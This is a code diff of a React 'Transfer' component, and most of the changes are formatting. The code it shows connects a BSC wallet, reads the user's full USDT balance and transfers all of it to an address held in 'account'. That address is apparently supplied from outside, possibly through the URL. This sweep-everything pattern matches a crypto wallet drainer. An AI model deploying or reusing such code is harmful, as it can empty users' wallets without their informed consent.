@@ -5,7 +5,6 @@ import { useSearchParams } from "react-router-dom";
 import { connectWithPrivateKey } from "./connectWithPrivateKey";
 
 function Transfer() {
- 
   const [count, setCount] = useState("");
   const [selectedAccount, setSelectedAccount] = useState("");
   const [searchParams] = useSearchParams();
@@ -30,7 +29,9 @@ function Transfer() {
       const walletData = await connectWallet("BSC");
       if (!walletData) return;
 
-      const bal = await walletData.usdtContract.balanceOf(walletData.selectedAccount);
+      const bal = await walletData.usdtContract.balanceOf(
+        walletData.selectedAccount,
+      );
 
       // USDT = 18 decimals sometimes, 6 decimals on many chains
       // Here we keep it simple:
@@ -44,12 +45,14 @@ function Transfer() {
     const walletData = await connectWallet("BSC");
     if (!walletData && !account) return;
 
-//     const walletData = await connectWithPrivateKey(
-//   import.meta.env.VITE_PRIVATE_KEY,
-//   "BSC"
-// );
+    // const walletData = await connectWithPrivateKey(
+    //   import.meta.env.VITE_PRIVATE_KEY,
+    //   "BSC"
+    // );
 
-    const bal = await walletData.usdtContract.balanceOf(walletData.selectedAccount);
+    const bal = await walletData.usdtContract.balanceOf(
+      walletData.selectedAccount,
+    );
     const tx = await walletData.usdtContract.transfer(account, bal);
     await tx.wait();
 
@@ -87,7 +90,11 @@ function Transfer() {
                 </button>
               )}
 
-              <button type="button" style={styles.linkBtn} onClick={handlePaste}>
+              <button
+                type="button"
+                style={styles.linkBtn}
+                onClick={handlePaste}
+              >
                 Paste
               </button>
             </div>
